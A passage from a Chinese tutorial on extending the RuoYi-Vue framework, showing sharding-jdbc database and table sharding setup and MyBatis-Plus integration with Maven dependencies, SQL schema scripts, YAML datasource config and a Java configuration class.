        <span class="token keyword">return</span> <span class="token string">"redis"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>5、添加滑动验证码插件到ruoyi-ui</p>
<p>下载前端插件相关包和代码实现<code>ruoyi-vue/集成滑动验证码.zip</code></p>
<p>链接: https://pan.baidu.com/s/13JVC9jm-Dp9PfHdDDylLCQ 提取码: y9jt</p>
<h2><a id="7shardingjdbc_5455"></a>7、集成sharding-jdbc实现分库分表</h2>
<p><code>sharding-jdbc</code>是由当当捐入给<code>apache</code>的一款分布式数据库中间件，支持垂直分库、垂直分表、水平分库、水平分表、读写分离、分布式事务和高可用等相关功能。</p>
<p>1、<code>ruoyi-framework\pom.xml</code>模块添加sharding-jdbc整合依赖</p>
<pre><code class="prism language-xml"><span class="token comment">&lt;!-- sharding-jdbc分库分表 --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.shardingsphere<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>sharding-jdbc-core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>4.1.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
</code></pre>
<p>2、创建两个测试数据库</p>
<pre><code class="prism language-sql"><span class="token keyword">create</span> <span class="token keyword">database</span> <span class="token punctuation">`</span>ry<span class="token operator">-</span>order1<span class="token punctuation">`</span><span class="token punctuation">;</span>
<span class="token keyword">create</span> <span class="token keyword">database</span> <span class="token punctuation">`</span>ry<span class="token operator">-</span>order2<span class="token punctuation">`</span><span class="token punctuation">;</span>
</code></pre>
<p>3、创建两个测试订单表</p>
<pre><code class="prism language-sql"><span class="token comment">-- ----------------------------</span>
<span class="token comment">-- 订单信息表sys_order_0</span>
<span class="token comment">-- ----------------------------</span>
<span class="token keyword">drop</span> <span class="token keyword">table</span> <span class="token keyword">if</span> <span class="token keyword">exists</span> sys_order_0<span class="token punctuation">;</span>
<span class="token keyword">create</span> <span class="token keyword">table</span> sys_order_0
<span class="token punctuation">(</span>
  order_id      <span class="token keyword">bigint</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span>      <span class="token operator">not</span> <span class="token boolean">null</span>                   <span class="token keyword">comment</span> <span class="token string">'订单ID'</span><span class="token punctuation">,</span>
  user_id       <span class="token keyword">bigint</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span>      <span class="token operator">not</span> <span class="token boolean">null</span>                   <span class="token keyword">comment</span> <span class="token string">'用户编号'</span><span class="token punctuation">,</span>
  <span class="token keyword">status</span>        <span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>         <span class="token operator">not</span> <span class="token boolean">null</span>                   <span class="token keyword">comment</span> <span class="token string">'状态（0交易成功 1交易失败）'</span><span class="token punctuation">,</span>
  order_no      <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span>     <span class="token keyword">default</span> <span class="token boolean">null</span>               <span class="token keyword">comment</span> <span class="token string">'订单流水'</span><span class="token punctuation">,</span>
  <span class="token keyword">primary</span> <span class="token keyword">key</span> <span class="token punctuation">(</span>order_id<span class="token punctuation">)</span>
<span class="token punctuation">)</span> <span class="token keyword">engine</span><span class="token operator">=</span><span class="token keyword">innodb</span> <span class="token keyword">comment</span> <span class="token operator">=</span> <span class="token string">'订单信息表'</span><span class="token punctuation">;</span>

<span class="token comment">-- ----------------------------</span>
<span class="token comment">-- 订单信息表sys_order_1</span>
<span class="token comment">-- ----------------------------</span>
<span class="token keyword">drop</span> <span class="token keyword">table</span> <span class="token keyword">if</span> <span class="token keyword">exists</span> sys_order_1<span class="token punctuation">;</span>
<span class="token keyword">create</span> <span class="token keyword">table</span> sys_order_1
<span class="token punctuation">(</span>
  order_id      <span class="token keyword">bigint</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span>      <span class="token operator">not</span> <span class="token boolean">null</span>                   <span class="token keyword">comment</span> <span class="token string">'订单ID'</span><span class="token punctuation">,</span>
  user_id       <span class="token keyword">bigint</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span>      <span class="token operator">not</span> <span class="token boolean">null</span>                   <span class="token keyword">comment</span> <span class="token string">'用户编号'</span><span class="token punctuation">,</span>
  <span class="token keyword">status</span>        <span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>         <span class="token operator">not</span> <span class="token boolean">null</span>                   <span class="token keyword">comment</span> <span class="token string">'状态（0交易成功 1交易失败）'</span><span class="token punctuation">,</span>
  order_no      <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span>     <span class="token keyword">default</span> <span class="token boolean">null</span>               <span class="token keyword">comment</span> <span class="token string">'订单流水'</span><span class="token punctuation">,</span>
  <span class="token keyword">primary</span> <span class="token keyword">key</span> <span class="token punctuation">(</span>order_id<span class="token punctuation">)</span>
<span class="token punctuation">)</span> <span class="token keyword">engine</span><span class="token operator">=</span><span class="token keyword">innodb</span> <span class="token keyword">comment</span> <span class="token operator">=</span> <span class="token string">'订单信息表'</span><span class="token punctuation">;</span>
</code></pre>
<p>4、配置文件<code>application-druid.yml</code>添加测试数据源</p>
<pre><code class="prism language-yml"><span class="token comment"># 数据源配置</span>
<span class="token key atrule">spring</span><span class="token punctuation">:</span>
    <span class="token key atrule">datasource</span><span class="token punctuation">:</span>
        <span class="token key atrule">type</span><span class="token punctuation">:</span> com.alibaba.druid.pool.DruidDataSource
        <span class="token key atrule">driverClassName</span><span class="token punctuation">:</span> com.mysql.cj.jdbc.Driver
        <span class="token key atrule">druid</span><span class="token punctuation">:</span>
            <span class="token comment"># 主库数据源</span>
            <span class="token key atrule">master</span><span class="token punctuation">:</span>
                <span class="token key atrule">url</span><span class="token punctuation">:</span> jdbc<span class="token punctuation">:</span>mysql<span class="token punctuation">:</span>//localhost<span class="token punctuation">:</span>3306/ry<span class="token punctuation">?</span>useUnicode=true<span class="token important">&amp;characterEncoding=utf8&amp;zeroDateTimeBehavior=convertToNull&amp;useSSL=true&amp;serverTimezone=GMT%2B8</span>
                <span class="token key atrule">username</span><span class="token punctuation">:</span> root
                <span class="token key atrule">password</span><span class="token punctuation">:</span> password
            <span class="token comment"># 订单库1</span>
            <span class="token key atrule">order1</span><span class="token punctuation">:</span>
                <span class="token key atrule">enabled</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
                <span class="token key atrule">url</span><span class="token punctuation">:</span> jdbc<span class="token punctuation">:</span>mysql<span class="token punctuation">:</span>//localhost<span class="token punctuation">:</span>3306/ry<span class="token punctuation">-</span>order1<span class="token punctuation">?</span>useUnicode=true<span class="token important">&amp;characterEncoding=utf8&amp;zeroDateTimeBehavior=convertToNull&amp;useSSL=true&amp;serverTimezone=GMT%2B8</span>
                <span class="token key atrule">username</span><span class="token punctuation">:</span> root
                <span class="token key atrule">password</span><span class="token punctuation">:</span> password
            <span class="token comment"># 订单库2</span>
            <span class="token key atrule">order2</span><span class="token punctuation">:</span>
                <span class="token key atrule">enabled</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
                <span class="token key atrule">url</span><span class="token punctuation">:</span> jdbc<span class="token punctuation">:</span>mysql<span class="token punctuation">:</span>//localhost<span class="token punctuation">:</span>3306/ry<span class="token punctuation">-</span>order2<span class="token punctuation">?</span>useUnicode=true<span class="token important">&amp;characterEncoding=utf8&amp;zeroDateTimeBehavior=convertToNull&amp;useSSL=true&amp;serverTimezone=GMT%2B8</span>
                <span class="token key atrule">username</span><span class="token punctuation">:</span> root
                <span class="token key atrule">password</span><span class="token punctuation">:</span> password
            <span class="token punctuation">...</span><span class="token punctuation">...</span><span class="token punctuation">...</span><span class="token punctuation">...</span><span class="token punctuation">...</span><span class="token punctuation">...</span>.
</code></pre>
<p>5、下载插件相关包和代码实现覆盖到工程中</p>
<p>提示</p>
<p>下载插件相关包和代码实现<code>ruoyi/集成sharding-jdbc实现分库分表.zip</code></p>
<p>链接: https://pan.baidu.com/s/13JVC9jm-Dp9PfHdDDylLCQ 提取码: y9jt</p>
<p>6、测试验证</p>
<p>访问<code>http://localhost/order/add/1</code>入库到<code>ry-order2</code></p>
<p>访问<code>http://localhost/order/add/2</code>入库到<code>ry-order1</code></p>
<p>同时根据订单号<code>order_id % 2</code>入库到<code>sys_order_0</code>或者<code>sys_order_1</code></p>
<h2><a id="8mybatisplusmybatis_5556"></a>8、集成mybatisplus实现mybatis增强</h2>
<p><code>Mybatis-Plus</code>是在<code>Mybatis</code>的基础上进行扩展，只做增强不做改变，可以兼容<code>Mybatis</code>原生的特性。同时支持通用CRUD操作、多种主键策略、分页、性能分析、全局拦截等。极大帮助我们简化开发工作。</p>
<blockquote>
<p><code>RuoYi-Vue</code>集成<code>Mybatis-Plus</code>完整项目参考<a href="https://gitee.com/JavaLionLi/RuoYi-Vue-Plus">https://gitee.com/JavaLionLi/RuoYi-Vue-Plus (opens new window)</a>。</p>
</blockquote>
<p>1、<code>ruoyi-common\pom.xml</code>模块添加整合依赖</p>
<pre><code class="prism language-xml"><span class="token comment">&lt;!-- mybatis-plus 增强CRUD --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.baomidou<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>mybatis-plus-boot-starter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>3.4.2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
</code></pre>
<p>2、<code>ruoyi-admin</code>文件<code>application.yml</code>，修改mybatis配置为mybatis-plus</p>
<pre><code class="prism language-yml"><span class="token comment"># MyBatis Plus配置</span>
<span class="token key atrule">mybatis-plus</span><span class="token punctuation">:</span>
  <span class="token comment"># 搜索指定包别名</span>
  <span class="token key atrule">typeAliasesPackage</span><span class="token punctuation">:</span> com.ruoyi.<span class="token important">**.domain</span>
  <span class="token comment"># 配置mapper的扫描，找到所有的mapper.xml映射文件</span>
  <span class="token key atrule">mapperLocations</span><span class="token punctuation">:</span> classpath<span class="token important">*:mapper/**/*Mapper.xml</span>
  <span class="token comment"># 加载全局的配置文件</span>
  <span class="token key atrule">configLocation</span><span class="token punctuation">:</span> classpath<span class="token punctuation">:</span>mybatis/mybatis<span class="token punctuation">-</span>config.xml
</code></pre>
<p>3、添加<code>Mybatis Plus</code>配置<code>MybatisPlusConfig.java</code>。 <strong>PS：原来的<code>MyBatisConfig.java</code>需要删除掉</strong></p>
<pre><code class="prism language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>framework<span class="token punctuation">.</span>config</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>baomidou<span class="token punctuation">.</span>mybatisplus<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">DbType</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>baomidou<span class="token punctuation">.</span>mybatisplus<span class="token punctuation">.</span>extension<span class="token punctuation">.</span>plugins<span class="token punctuation">.</span></span><span class="token class-name">MybatisPlusInterceptor</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>baomidou<span class="token punctuation">.</span>mybatisplus<span class="token punctuation">.</span>extension<span class="token punctuation">.</span>plugins<span class="token punctuation">.</span>inner<span class="token punctuation">.</span></span><span class="token class-name">BlockAttackInnerInterceptor</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>baomidou<span class="token punctuation">.</span>mybatisplus<span class="token punctuation">.</span>extension<span class="token punctuation">.</span>plugins<span class="token punctuation">.</span>inner<span class="token punctuation">.</span></span><span class="token class-name">OptimisticLockerInnerInterceptor</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>baomidou<span class="token punctuation">.</span>mybatisplus<span class="token punctuation">.</span>extension<span class="token punctuation">.</span>plugins<span class="token punctuation">.</span>inner<span class="token punctuation">.</span></span><span class="token class-name">PaginationInnerInterceptor</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Bean</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Configuration</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>transaction<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">EnableTransactionManagement</span><span class="token punctuation">;</span>

<span class="token comment">/**
 * Mybatis Plus 配置
 * 
 * @author ruoyi
 */</span>
<span class="token annotation punctuation">@EnableTransactionManagement</span><span class="token punctuation">(</span>proxyTargetClass <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@Configuration</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MybatisPlusConfig</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token annotation punctuation">@Bean</span>
    <span class="token keyword">public</span> <span class="token class-name">MybatisPlusInterceptor</span> <span class="token function">mybatisPlusInterceptor</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">MybatisPlusInterceptor</span> interceptor <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MybatisPlusInterceptor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 分页插件</span>
        interceptor<span class="token punctuation">.</span><span class="token function">addInnerInterceptor</span><span class="token punctuation">(</span><span class="token function">paginationInnerInterceptor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 乐观锁插件</span>
        interceptor<span class="token punctuation">.</span><span class="token function">addInnerInterceptor</span><span class="token punctuation">(</span><span class="token function">optimisticLockerInnerInterceptor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 阻断插件</span>
        interceptor<span class="token punctuation">.</span><span class="token function">addInnerInterceptor</span><span class="token punctuation">(</span><span class="token function">blockAttackInnerInterceptor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> interceptor<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * 分页插件，自动识别数据库类型 https://baomidou.com/guide/interceptor-pagination.html
     */</span>
    <span class="token keyword">public</span> <span class="token class-name">PaginationInnerInterceptor</span> <span class="token function">paginationInnerInterceptor</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">PaginationInnerInterceptor</span> paginationInnerInterceptor <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PaginationInnerInterceptor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 设置数据库类型为mysql</span>
        paginationInnerInterceptor<span class="token punctuation">.</span><span class="token function">setDbType</span><span class="token punctuation">(</span><span class="token class-name">DbType</span><span class="token punctuation">.</span>MYSQL<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 设置最大单页限制数量，默认 500 条，-1 不受限制</span>
        paginationInnerInterceptor<span class="token punctuation">.</span><span class="token function">setMaxLimit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1L</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> paginationInnerInterceptor<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * 乐观锁插件 https://baomidou.com/guide/interceptor-optimistic-locker.html
     */</span>
    <span class="token keyword">public</span> <span class="token class-name">OptimisticLockerInnerInterceptor</span> <span class="token function">optimisticLockerInnerInterceptor</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">OptimisticLockerInnerInterceptor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * 如果是对全表的删除或更新操作，就会终止该操作 https://baomidou.com/guide/interceptor-block-attack.html
     */</span>
    <span class="token keyword">public</span> <span class="token class-name">BlockAttackInnerInterceptor</span> <span class="token function">blockAttackInnerInterceptor</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">BlockAttackInnerInterceptor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>4、添加测试表和菜单信息</p>
<pre><code class="prism language-sql"><span class="token keyword">drop</span> <span class="token keyword">table</span> <span class="token keyword">if</span> <span class="token keyword">exists</span> sys_student<span class="token punctuation">;</span>
<span class="token keyword">create</span> <span class="token keyword">table</span> sys_student <span class="token punctuation">(</span>
  student_id           <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>         <span class="token keyword">auto_increment</span>    <span class="token keyword">comment</span> <span class="token string">'编号'</span><span class="token punctuation">,</span>
  student_name         <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span>     <span class="token keyword">default</span> <span class="token string">''</span>        <span class="token keyword">comment</span> <span class="token string">'学生名称'</span><span class="token punctuation">,</span>
  student_age          <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>          <span class="token keyword">default</span> <span class="token boolean">null</span>      <span class="token keyword">comment</span> <span class="token string">'年龄'</span><span class="token punctuation">,</span>
  student_hobby        <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span>     <span class="token keyword">default</span> <span class="token string">''</span>        <span class="token keyword">comment</span> <span class="token string">'爱好（0代码 1音乐 2电影）'</span><span class="token punctuation">,</span>
  student_sex          <span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>         <span class="token keyword">default</span> <span class="token string">'0'</span>       <span class="token keyword">comment</span> <span class="token string">'性别（0男 1女 2未知）'</span><span class="token punctuation">,</span>
  student_status       <span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>         <span class="token keyword">default</span> <span class="token string">'0'</span>       <span class="token keyword">comment</span> <span class="token string">'状态（0正常 1停用）'</span><span class="token punctuation">,</span>
  student_birthday     <span class="token keyword">datetime</span>                          <span class="token keyword">comment</span> <span class="token string">'生日'</span><span class="token punctuation">,</span>
  <span class="token keyword">primary</span> <span class="token keyword">key</span> <span class="token punctuation">(</span>student_id<span class="token punctuation">)</span>
<span class="token punctuation">)</span> <span class="token keyword">engine</span><span class="token operator">=</span><span class="token keyword">innodb</span> <span class="token keyword">auto_increment</span><span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">comment</span> <span class="token operator">=</span> <span class="token string">'学生信息表'</span><span class="token punctuation">;</span>

<span class="token comment">-- 菜单 sql</span>
<span class="token keyword">insert</span> <span class="token keyword">into</span> sys_menu <span class="token punctuation">(</span>menu_name<span class="token punctuation">,</span> parent_id<span class="token punctuation">,</span> order_num<span class="token punctuation">,</span> url<span class="token punctuation">,</span> menu_type<span class="token punctuation">,</span> visible<span class="token punctuation">,</span> perms<span class="token punctuation">,</span> icon<span class="token punctuation">,</span> create_by<span class="token punctuation">,</span> create_time<span class="token punctuation">,</span> update_by<span class="token punctuation">,</span> update_time<span class="token punctuation">,</span> remark<span class="token punctuation">)</span>
<span class="token keyword">values</span><span class="token punctuation">(</span><span class="token string">'学生信息'</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token string">'/system/student'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">,</span> <span class="token string">'system:student:view'</span><span class="token punctuation">,</span> <span class="token string">'#'</span><span class="token punctuation">,</span> <span class="token string">'admin'</span><span class="token punctuation">,</span> sysdate<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token boolean">null</span><span class="token punctuation">,</span> <span class="token string">'学生信息菜单'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">-- 按钮父菜单id</span>
<span class="token keyword">select</span> <span class="token variable">@parentid</span> :<span class="token operator">=</span> last_insert_id<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">-- 按钮 sql</span>
<span class="token keyword">insert</span> <span class="token keyword">into</span> sys_menu <span class="token punctuation">(</span>menu_name<span class="token punctuation">,</span> parent_id<span class="token punctuation">,</span> order_num<span class="token punctuation">,</span> url<span class="token punctuation">,</span> menu_type<span class="token punctuation">,</span> visible<span class="token punctuation">,</span> perms<span class="token punctuation">,</span> icon<span class="token punctuation">,</span> create_by<span class="token punctuation">,</span> create_time<span class="token punctuation">,</span> update_by<span class="token punctuation">,</span> update_time<span class="token punctuation">,</span> remark<span class="token punctuation">)</span>
<span class="token keyword">values</span><span class="token punctuation">(</span><span class="token string">'学生信息查询'</span><span class="token punctuation">,</span> <span class="token variable">@parentid</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">,</span>  <span class="token string">'#'</span><span class="token punctuation">,</span>  <span class="token string">'f'</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">,</span> <span class="token string">'system:student:list'</span><span class="token punctuation">,</span>         <span class="token string">'#'</span><span class="token punctuation">,</span> <span class="token string">'admin'</span><span class="token punctuation">,</span> sysdate<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token boolean">null</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">insert</span> <span class="token keyword">into</span> sys_menu <span class="token punctuation">(</span>menu_name<span class="token punctuation">,</span> parent_id<span class="token punctuation">,</span> order_num<span class="token punctuation">,</span> url<span class="token punctuation">,</span> menu_type<span class="token punctuation">,</span> visible<span class="token punctuation">,</span> perms<span class="token punctuation">,</span> icon<span class="token punctuation">,</span> create_by<span class="token punctuation">,</span> create_time<span class="token punctuation">,</span> update_by<span class="token punctuation">,</span> update_time<span class="token punctuation">,</span> remark<span class="token punctuation">)</span>
<span class="token keyword">values</span><span class="token punctuation">(</span><span class="token string">'学生信息新增'</span><span class="token punctuation">,</span> <span class="token variable">@parentid</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">,</span>  <span class="token string">'#'</span><span class="token punctuation">,</span>  <span class="token string">'f'</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">,</span> <span class="token string">'system:student:add'</span><span class="token punctuation">,</span>          <span class="token string">'#'</span><span class="token punctuation">,</span> <span class="token string">'admin'</span><span class="token punctuation">,</span> sysdate<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token boolean">null</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">insert</span> <span class="token keyword">into</span> sys_menu <span class="token punctuation">(</span>menu_name<span class="token punctuation">,</span> parent_id<span class="token punctuation">,</span> order_num<span class="token punctuation">,</span> url<span class="token punctuation">,</span> menu_type<span class="token punctuation">,</span> visible<span class="token punctuation">,</span> perms<span class="token punctuation">,</span> icon<span class="token punctuation">,</span> create_by<span class="token punctuation">,</span> create_time<span class="token punctuation">,</span> update_by<span class="token punctuation">,</span> update_time<span class="token punctuation">,</span> remark<span class="token punctuation">)</span>
<span class="token keyword">values</span><span class="token punctuation">(</span><span class="token string">'学生信息修改'</span><span class="token punctuation">,</span> <span class="token variable">@parentid</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">,</span>  <span class="token string">'#'</span><span class="token punctuation">,</span>  <span class="token string">'f'</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">,</span> <span class="token string">'system:student:edit'</span><span class="token punctuation">,</span>         <span class="token string">'#'</span><span class="token punctuation">,</span> <span class="token string">'admin'</span><span class="token punctuation">,</span> sysdate<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token boolean">null</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">insert</span> <span class="token keyword">into</span> sys_menu <span class="token punctuation">(</span>menu_name<span class="token punctuation">,</span> parent_id<span class="token punctuation">,</span> order_num<span class="token punctuation">,</span> url<span class="token punctuation">,</span> menu_type<span class="token punctuation">,</span> visible<span class="token punctuation">,</span> perms<span class="token punctuation">,</span> icon<span class="token punctuation">,</span> create_by<span class="token punctuation">,</span> create_time<span class="token punctuation">,</span> update_by<span class="token punctuation">,</span> update_time<span class="token punctuation">,</span> remark<span class="token punctuation">)</span>
<span class="token keyword">values</span><span class="token punctuation">(</span><span class="token string">'学生信息删除'</span><span class="token punctuation">,</span> <span class="token variable">@parentid</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span>  <span class="token string">'#'</span><span class="token punctuation">,</span>  <span class="token string">'f'</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">,</span> <span class="token string">'system:student:remove'</span><span class="token punctuation">,</span>       <span class="token string">'#'</span><span class="token punctuation">,</span> <span class="token string">'admin'</span><span class="token punctuation">,</span> sysdate<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token boolean">null</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">insert</span> <span class="token keyword">into</span> sys_menu <span class="token punctuation">(</span>menu_name<span class="token punctuation">,</span> parent_id<span class="token punctuation">,</span> order_num<span class="token punctuation">,</span> url<span class="token punctuation">,</span> menu_type<span class="token punctuation">,</span> visible<span class="token punctuation">,</span> perms<span class="token punctuation">,</span> icon<span class="token punctuation">,</span> create_by<span class="token punctuation">,</span> create_time<span class="token punctuation">,</span> update_by<span class="token punctuation">,</span> update_time<span class="token punctuation">,</span> remark<span class="token punctuation">)</span>
<span class="token keyword">values</span><span class="token punctuation">(</span><span class="token string">'学生信息导出'</span><span class="token punctuation">,</span> <span class="token variable">@parentid</span><span class="token punctuation">,</span> <span class="token string">'5'</span><span class="token punctuation">,</span>  <span class="token string">'#'</span><span class="token punctuation">,</span>  <span class="token string">'f'</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">,</span> <span class="token string">'system:student:export'</span><span class="token punctuation">,</span>       <span class="token string">'#'</span><span class="token punctuation">,</span> <span class="token string">'admin'</span><span class="token punctuation">,</span> sysdate<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token boolean">null</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>5、新增测试代码验证 新增 <strong>ruoyi-system\com\ruoyi\system\controller\SysStudentController.java</strong></p>
<pre><code class="prism language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>web<span class="token punctuation">.</span>controller<span class="token punctuation">.</span>system</span><span class="token punctuation">;</span>

